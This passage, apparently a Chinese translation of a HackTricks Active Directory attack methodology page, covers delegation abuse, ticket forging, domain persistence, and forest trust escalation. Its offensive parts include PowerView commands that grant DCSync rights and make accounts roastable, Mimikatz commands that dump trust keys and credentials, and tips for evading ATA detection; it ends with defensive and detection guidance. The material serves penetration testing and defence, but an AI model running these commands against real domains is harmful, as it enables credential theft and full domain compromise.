> 注意，这种操作会产生相当多的 **噪声**，而 **LAPS** 可以 **缓解** 这一问题。

### MSSQL 滥用与受信任链接

如果用户拥有 **访问 MSSQL 实例** 的权限，就可能利用该权限在 MSSQL 主机上 **执行命令**（前提是实例以 SA 身份运行）、**窃取** NetNTLM **哈希**，甚至实施 **中继** **攻击**。\
如果一个 MSSQL 实例通过数据库链接受另一个实例信任，那么拥有链接数据库权限的用户可能能够 **利用信任关系在另一个实例上执行查询**。这些信任关系可以串联起来，最终可能到达配置错误的数据库，使用户能够执行命令。\
**数据库之间的链接即使跨越林信任也有效。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署平台滥用

第三方资产盘点和部署套件通常会提供可用于获取凭据和执行代码的强大途径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### 无约束委派

如果发现任何 Computer 对象具有 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性，并且你在该计算机上拥有域权限，就能够从内存中导出所有登录过该计算机的用户的 TGT。\
因此，如果 **Domain Admin 登录该计算机**，你就能够导出其 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充该用户。\
借助约束委派，你甚至可以 **自动攻陷 Print Server**（希望它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### 约束委派

如果某个用户或计算机被允许使用“约束委派”，就能够 **冒充任意用户以访问计算机上的某些服务**。\
因此，如果你 **攻陷** 该用户/计算机的 **哈希**，就能够 **冒充任意用户**（甚至是 domain admin）以访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### 基于资源的约束委派

在远程计算机的 Active Directory 对象上拥有 **WRITE** 权限，即可获得以 **提升的权限** 执行代码的能力：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 权限/ACL 滥用

被攻陷的用户可能对某些域对象拥有一些 **有用的权限**，使你能够横向 **移动**/**提升** 权限。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 服务滥用

如果发现域内有 **Spool 服务正在监听**，就可以 **滥用** 它来 **获取新凭据** 和 **提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 第三方会话滥用

如果 **其他用户** **访问** 了被 **攻陷** 的计算机，就可以 **从内存中收集凭据**，甚至 **向其进程注入 beacon** 来冒充他们。\
用户通常会通过 RDP 访问系统，因此这里介绍如何对第三方 RDP 会话实施几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一种管理已加入域的计算机上 **本地 Administrator 密码** 的机制，确保密码经过 **随机化**、各不相同并频繁 **更换**。这些密码存储在 Active Directory 中，并通过 ACL 控制访问，仅授权用户可以访问。只要拥有足够权限来访问这些密码，就可以横向访问其他计算机。


{{#ref}}
laps.md
{{#endref}}

### 证书窃取

从被攻陷的计算机中 **收集证书**，可能是提升环境内权限的一种途径：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 证书模板滥用

如果配置了 **存在漏洞的模板**，就可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高权限账户的后渗透

### 导出域凭据

获得 **Domain Admin**，甚至更高的 **Enterprise Admin** 权限后，就可以 **导出** **域数据库**：_ntds.dit_。

[**关于 DCSync attack 的更多信息，请参见此处**](dcsync.md)。

[**关于如何窃取 NTDS.dit 的更多信息，请参见此处**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

包含 `ntds.dit` 和 `SYSTEM` hive 的可读备份档案，即使尚未解压，也应视为已暴露的目录数据。密码哈希过期并不意味着对象的其他属性就是安全的：`description` 等字段可能包含凭据或操作备注。先检查档案中的成员名称，并避免在常规枚举输出中包含解压后的数据库内容。

### 将 Privesc 用作持久化

前面讨论的一些技术也可以用于持久化。\
例如，你可以：

- 让用户容易受到 [**Kerberoast**](kerberoast.md) 攻击񎟂

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- 使用户容易受到 [**ASREPRoast**](asreproast.md) 攻击。

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- 向用户授予 [**DCSync**](#dcsync) 权限

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** 会利用 **NTLM hash**（例如 **PC account 的 hash**），为特定服务创建一张**合法的 Ticket Granting Service (TGS) ticket**。这种方法用于**获取该服务的权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 是指攻击者获取 Active Directory (AD) 环境中 **krbtgt account 的 NTLM hash**。这个 account 很特殊，因为它用于签署所有 **Ticket Granting Tickets (TGTs)**，而 TGT 是在 AD 网络中进行身份验证的关键。

获取该 hash 后，攻击者可以为任意 account 创建 **TGT**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类 ticket 与 golden ticket 类似，但其伪造方式可以**绕过常见的 golden ticket 检测机制**。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个 account 的 certificates，或能够申请这些 certificates**，是维持对该用户 account 持久访问的一种好方法（即使用户更改了密码）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**也可以利用 certificates 在 domain 内维持高权限访问：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** object 会通过对这些组应用标准的 **Access Control List (ACL)**，确保 **privileged groups**（例如 Domain Admins 和 Enterprise Admins）的安全，防止未经授权的更改。不过，这个功能也可能遭到滥用：如果攻击者修改 AdminSDHolder 的 ACL，授予普通用户完全访问权限，该用户就能广泛控制所有 privileged groups。因此，这项旨在提供保护的安全措施也可能适得其反；若不密切监控，就会导致不当访问。

[**点击此处了解有关 AdminDSHolder Group 的更多信息。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

每个 **Domain Controller (DC)** 上都存在一个 **local administrator** account。取得此类机器的管理员权限后，可以使用 **mimikatz** 提取本地 Administrator hash。之后，需要修改注册表来**启用此密码**，从而远程访问本地 Administrator account。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以为某个 **user** 授予对特定 domain objects 的一些**特殊权限**，使该 user **日后能够提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于**存储**一个 **object** 对另一个 **object** 所拥有的**权限**。只要能对某个 object 的 **security descriptor** 做出**少量修改**，就可以在无需加入 privileged group 的情况下，获得对该 object 的重要权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` auxiliary class，创建具有较短存续时间的 principals/GPOs/DNS records，并设置 `entryTTL`/`msDS-Entry-Time-To-Die`；这些对象会自行删除且不留下 tombstones，从而抹除 LDAP 证据，但会留下孤立的 SIDs、失效的 `gPLink` references 或缓存的 DNS 响应（例如污染 AdminSDHolder ACE，或恶意设置 `gPCFileSysPath`/AD-integrated DNS redirects）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS**，设置一个**通用密码**，从而获得对所有 domain accounts 的访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[点击此处了解 SSP (Security Support Provider)。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建**自己的 SSP**，以**明文**捕获用于访问该机器的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**，并利用该 DC 向指定 objects **推送 attributes**（SIDHistory、SPNs...），且不会留下任何有关这些**修改**的**日志**。你**需要 DA** 权限，并且必须位于 **root domain** 中。\
请注意，如果使用错误的数据，会留下相当难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论过，如果你有**足够权限读取 LAPS passwords**，该如何提升权限。不过，这些密码也可以用于**维持持久访问**。\
请查看：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着，**攻陷单个 domain 就可能导致整个 Forest 被攻陷**。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，使一个 **domain** 中的 user 能够访问另一个 **domain** 中的资源。它本质上是在两个 domain 的身份验证系统之间建立连接，使身份验证验证过程能够顺畅进行。建立 trust 时，domains 会在各自的 **Domain Controllers (DCs)** 中交换并保存特定的 **keys**，这些 keys 对 trust 的完整性至关重要。

典型情况下，如果 user 想要访问 **trusted domain** 中的服务，必须先向自己 domain 的 DC 请求一种称为 **inter-realm TGT** 的特殊 ticket。此 TGT 使用两个 domain 约定共享的 **key** 加密。随后，user 将此 TGT 提交给 **trusted domain 的 DC**，以获取服务 ticket (**TGS**)。trusted domain 的 DC 成功验证 inter-realm TGT 后，会签发 TGS，授予 user 访问该服务的权限。

**步骤**：

1. **Domain 1** 中的 **client computer** 使用其 **NTLM hash** 向自己的 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，以启动流程。
2. 如果 client 身份验证成功，DC1 会签发新的 TGT。
3. 随后，client 向 DC1 请求 **inter-realm TGT**，以访问 **Domain 2** 中的资源。
4. 作为两个 domain 之间双向 domain trust 的一部分，inter-realm TGT 使用 DC1 与 DC2 共享的 **trust key** 加密。
5. Client 将 inter-realm TGT 提交给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享的 trust key 验证 inter-realm TGT；如果有效，就为 client 想要访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，client 将此 TGS 提交给服务器，以访问 Domain 2 中的服务。该 TGS 使用服务器的 account hash 加密。

### Different trusts

需要注意，**trust 可以是单向或双向的**。在双向 trust 中，两个 domains 会相互信任；而在**单向** trust 关系中，一个 domain 是 **trusted** domain，另一个是 **trusting** domain。在后一种情况下，**你只能从 trusted domain 访问 trusting domain 中的资源**。

如果 Domain A 信任 Domain B，那么 A 是 trusting domain，B 是 trusted domain。此外，在 **Domain A** 中，这属于 **Outbound trust**；在 **Domain B** 中，则属于 **Inbound trust**。

**不同的 trust 关系**

- **Parent-Child Trusts**：这是同一 forest 内常见的配置，child domain 会自动与其 parent domain 建立双向、可传递的 trust。这意味着身份验证请求可以在 parent 与 child 之间顺畅流动。
- **Cross-link Trusts**：也称为“shortcut trusts”，用于在 child domains 之间建立 trust，以加快 referral 流程。在复杂的 forests 中，身份验证 referrals 通常必须先向上到达 forest root，再向下到达目标 domain。建立 cross-links 后，可以缩短这段路径，在地理位置分散的环境中尤其有用。
- **External Trusts**：在不同且互不相关的 domains 之间建立，本质上不可传递。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 适用于访问当前 forest 之外、且未通过 forest trust 连接的 domain 中的资源。External trusts 会通过 SID filtering 加强安全性。
- **Tree-root Trusts**：在 forest root domain 与新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对于向 forest 添加新的 domain trees 很重要，可让它们保留唯一的 domain name，并确保双向传递性。更多信息请参阅 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这是两个 forest root domains 之间的双向、可传递 trust，也会启用 SID filtering 来加强安全措施。
- **MIT Trusts**：与非 Windows、[符合 RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos domains 建立。这类 trust 更为专用，适用于需要与 Windows 生态系统之外的 Kerberos 系统集成的环境。

#### **trust 关系**的其他区别

- Trust 关系也可以是**可传递的**（A 信任 B，B 信任 C，则 A 信任 C），也可以是**不可传递的**。
- Trust 关系可以设置为**双向 trust**（双方互相信任）或**单向 trust**（只有一方信任另一方）。

### Attack Path

1. **枚举** trusting relationships
2. 检查是否有任何 **security principal**（user/group/computer）可以**访问** **另一个 domain** 的资源；权限可能来自 ACE entries，也可能是因为该 principal 属于另一个 domain 的组。查找**跨 domain 的关系**（这可能正是创建 trust 的原因）。
   1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **攻陷**能够在 domains 之间**横向移动**的 **accounts**。

攻击者可以通过以下三种主要机制访问另一个 domain 中的资源：

- **Local Group Membership**：Principals 可能会被加入机器上的本地组，例如服务器上的 “Administrators” 组，从而获得对该机器的显著控制权。
- **Foreign Domain Group Membership**：Principals 也可能是 foreign domain 中组的成员。不过，这种方法是否有效取决于 trust 的类型以及组的作用范围。
- **Access Control Lists (ACLs)**：Principals 可能会被列入 **ACL**，尤其是作为 **DACL** 中 **ACEs** 的主体，从而获得对特定资源的访问权限。若想深入了解 ACLs、DACLs 和 ACEs 的运作机制，白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 是非常有价值的参考资料。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**，以查找 domain 中的 foreign security principals。这些是来自**外部 domain/forest** 的 user/group。

你可以在 **Bloodhound** 中检查，或使用 powerview：

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

枚举域信任的其他方法：

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> 有 **2 个受信任密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以通过以下方式查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

利用 SID-History injection 滥用信任关系，从子域/父域提升为 Enterprise admin：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 利用可写的 Configuration NC

了解如何利用 Configuration Naming Context (NC) 至关重要。在 Active Directory (AD) 环境中，Configuration NC 是整个林的配置数据中央存储库。这些数据会复制到林中的每个 Domain Controller (DC)，其中可写 DC 会维护 Configuration NC 的可写副本。要利用这一点，必须在 DC 上拥有 **SYSTEM 权限**，最好是子域 DC。

**将 GPO 链接到根 DC 站点**

Configuration NC 的 Sites 容器包含 AD 林中所有已加入域的计算机的站点信息。攻击者在任意 DC 上以 SYSTEM 权限操作时，都可以将 GPO 链接到根 DC 站点。此操作可能通过操纵应用于这些站点的策略来危害根域。

如需深入了解，可阅读关于 [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) 的研究。<sup>[[12]](#references)</sup>

**危害林中的任意 gMSA**

一种攻击途径是针对域中的特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上拥有 SYSTEM 权限后，便可访问 KDS Root key，并计算整个林中任意 gMSA 的密码。

详细分析和分步指南见：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor – 滥用迁移属性）：


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

其他外部研究：[Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema change attack**

这种方法需要耐心等待新的特权 AD 对象创建。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，授予任意用户对所有类的完全控制权。这可能导致对新创建的 AD 对象进行未授权访问和控制。

更多内容请参阅 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)。<sup>[[14]](#references)</sup>

**利用 ADCS ESC5 从 DA 提升为 EA**

ADCS ESC5 漏洞针对对 Public Key Infrastructure (PKI) 对象的控制，可创建一个证书模板，使攻击者能够以林中任意用户的身份进行身份验证。由于 PKI 对象位于 Configuration NC 中，攻陷可写子域 DC 后即可执行 ESC5 攻击。

更多详情请参阅 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)。<sup>[[15]](#references)</sup> 如果环境中没有 ADCS，攻击者也可以搭建所需组件，相关讨论见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。<sup>[[16]](#references)</sup>

### 外部林域 - 单向（入站）或双向

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

在此场景中，外部域信任你的域，并赋予你对该域**尚未确定的权限**。你需要找出**你所在域中的哪些主体对外部域拥有哪些访问权限**，然后尝试利用这些权限：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

在此场景中，**你的域**会向来自**其他域**的主体授予一些**权限**。

然而，当一个域被信任域**信任**时，受信任域会**创建一个用户**，其**名称可预测**，并使用**信任密码**作为密码。这意味着，可以**访问信任域中的用户，进而进入受信任域**，对其进行枚举并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻陷受信任域的方法，是在与域信任**方向相反**的方向上找到已建立的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种攻陷受信任域的方法，是等待在一台**受信任域用户能够访问**的机器上，等待其通过 **RDP** 登录。随后，攻击者可以向 RDP 会话进程注入代码，并从那里**访问受害者的源域**。\
此外，如果**受害者挂载了自己的硬盘**，攻击者就可以从 **RDP 会话**进程将**后门**存入该硬盘的**启动文件夹**。这种技术称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解措施

### **SID Filtering：**

- 利用 SID 历史属性跨林信任发起攻击的风险，可通过 SID Filtering 缓解。所有林间信任默认启用此功能。这一机制基于这样的假设：林内信任是安全的；按照 Microsoft 的立场，安全边界是林，而不是域。
- 但有个问题：SID filtering 可能会干扰应用程序和用户访问，因此有时会被停用。

### **Selective Authentication：**

- 对于林间信任，使用 Selective Authentication 可确保来自两个林的用户不会被自动验证。相反，用户必须获得明确授权，才能访问信任域或林中的域和服务器。
- 请注意，这些措施无法防止对可写 Configuration Naming Context (NC) 的利用，也无法防御针对信任账户的攻击。

[**更多关于域信任的信息，请参阅 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## 基于 LDAP 的 AD 主机端 Implant 滥用

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP 原语重新实现为 x64 Beacon Object Files，使其能够完全在主机上的 implant（例如 Adaptix C2）内运行。操作人员通过运行 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该工具包，加载 `ldap.axs`，然后在 beacon 中调用 `ldap <subcommand>`。所有流量都通过当前登录安全上下文，经由带签名/密封的 LDAP (389) 或自动信任证书的 LDAPS (636) 传输，因此无需 socks 代理或磁盘痕迹。<sup>[[4]](#references)</sup>

### Implant 端 LDAP 枚举

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 会将短名称/OU 路径解析为完整 DN，并导出相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 会提取任意属性（包括安全描述符）以及来自 `rootDSE` 的林/域元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 可直接从 LDAP 中列出适合进行 roasting 的对象、委派设置，以及现有的 [基于资源的约束委派](resource-based-constrained-delegation.md)描述符。
- `get-acl` 和 `get-writable --detailed` 会解析 DACL，列出受托主体、权限（GenericAll/WriteDACL/WriteOwner/属性写入）和继承关系，从而立即找到可用于 ACL 权限提升的目标。

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### 用于提权与持久化的 LDAP 写入原语

- 对象创建 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）允许操作员在拥有 OU 权限的任意位置创建新主体或机器账户。找到写入属性权限后，`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 可直接劫持目标。
- 面向 ACL 的命令，例如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`，可将 AD 任意对象上的 WriteDACL/WriteOwner 转化为密码重置、组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### 委派、Roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 可立即让遭入侵的用户变得易受 Kerberoast 攻击；`add-asreproastable`（UAC 切换）则可在不修改密码的情况下，将其标记为可进行 AS-REP roasting。
- 委派宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 改写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用受限/非约束/RBCD 攻击路径，无需远程 PowerShell 或 RSAT。

### sidHistory 注入、OU 移动与攻击面塑造

- `add-sidhistory` 可将特权 SID 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），完全通过 LDAP/LDAPS 实现隐蔽的访问继承。
- `move-object` 可更改计算机或用户的 DN/OU，让攻击者将资产移入已有委派权限的 OU，然后滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 范围严格的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）可在操作员收集凭据或建立持久化后快速回滚，从而最大限度减少遥测痕迹。

## AD -> Azure 与 Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**在此了解如何保护凭据。**](../stealing-credentials/credentials-protections.md)

### **凭据保护的防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录 Domain Controllers，避免在其他主机上使用其账户。
- **服务账户权限**：服务不应以 Domain Admin（DA）权限运行，以保障安全。
- **临时权限限制**：需要 DA 权限的任务应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解措施**：审计事件 ID 2889/3074/3075，然后在 DC/客户端上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 活动的协议级指纹识别

如果要检测常见的 AD 攻击手法，**不要只依赖由操作员控制的痕迹**，例如重命名后的二进制文件、服务名称、临时批处理文件或输出路径。先建立合法 Windows 客户端构造 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI 流量的基线，再查找即使操作员修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 仍会保留的**实现特征**。<sup>[[8]](#references)</sup>

- **高置信度的独立候选特征**（请先根据自身基线验证）：
  - 已认证 DCE/RPC 使用 `auth_context_id = 79231 + ctx_id`
  - DCE/RPC 身份验证填充内容为 `0xff`
  - LDAP Kerberos 绑定在 SPNEGO `mechToken` 中直接放入原始 Kerberos `AP-REQ`
  - SMB2/3 协商请求使用看似 ASCII 字符串的 `ClientGuid` 值
  - WMI `IWbemLevel1Login::NTLMLogin` 使用非标准命名空间 `//./root/cimv2`
  - 硬编码的 Kerberos nonce 值
- **更适合作为关联/评分特征**：
  - Kerberos etype 列表稀疏或重复、`PA-DATA` 异常/缺失，或 TGS-REQ etype 顺序不同于原生 Windows
  - NTLM Type 1 消息缺少版本信息，或 Type 3 消息的主机名为空
  - DCE/RPC 中承载原始 NTLMSSP 而非 SPNEGO、缺少 DCE/RPC verification trailers，或 SPNEGO/Kerberos OID 不匹配
  - 同一主机/用户/会话/时间窗口出现多个此类特征，远比任何单个弱特征有力
- **用作补充信息，不要单独触发告警**：
  - 默认文件名、输出路径、随机服务名、临时批处理文件名、默认计算机账户名，以及工具特有的 HTTP/WebDAV/RDP/MSSQL 字符串
  - 操作员很容易修改这些特征；最好用它们来解释跨协议特征集为何可疑
- **操作说明**：
  - 有些信号需要解密流量、[PCAP/Zeek 解析](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或服务端可见性
  - 将其升级为告警前，先用 Samba/Linux 客户端、设备和旧版软件进行验证
  - 随着对基线的信心增强，将检测从补充信息逐步升级为狩猎，再升级为告警

### **实施欺骗技术**

- 实施欺骗技术需要设置陷阱，例如诱饵用户或计算机，并为其配置密码永不过期或标记为 Trusted for Delegation 等特征。详细方法包括创建具有特定权限的用户，或将用户添加到高权限组。<sup>[[2]](#references)</sup>
- 一个实际示例是使用如下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参阅 GitHub 上的 [Deploy-Deception](https://github.com/samratashok/Deploy-Deception)。

### **识别欺骗**

- **用户对象**：可疑迹象包括异常的 ObjectSID、很少登录、创建日期异常以及错误密码计数较低。
- **常见迹象**：比较潜在诱饵对象与真实对象的属性，可发现不一致之处。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 等工具有助于识别此类欺骗。

### **绕过检测系统**

- **绕过 Microsoft ATA 检测**：
  - **用户枚举**：避免在 Domain Controllers 上枚举会话，以免触发 ATA 检测。
  - **票据冒用**：使用 **aes** 密钥创建票据有助于规避检测，避免降级为 NTLM。
  - **DCSync 攻击**：建议从非 Domain Controller 执行，以避免 ATA 检测；直接从 Domain Controller 执行会触发告警。

## References

- [1] [攻击域信任指南](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [在 Active Directory 中伪造信任以实施欺骗](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [从 Domain Admin 到 Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – 用于 Active Directory 利用的内存 LDAP 工具包](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck！将 NTLM 哈希用作字典](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – 剖析 Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon：通过 Netlogon 接管 Active Directory 账户](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - 如何管理与 CVE-2020-1472 相关的 Netlogon 安全通道连接变更](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [深入了解被遗忘的 Null Session 与 MS-RPC 接口](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter 是域间的安全边界吗？（第 4 部分）- 绕过 SID filtering 研究](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter 是域间的安全边界吗？（第 5 部分）- Golden GMSA 信任攻击 - 从子域到父域](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter 是域间的安全边界吗？（第 6 部分）- 架构变更信任攻击 - 从子域到父域](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [通过 ESC5 从 DA 提权到 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
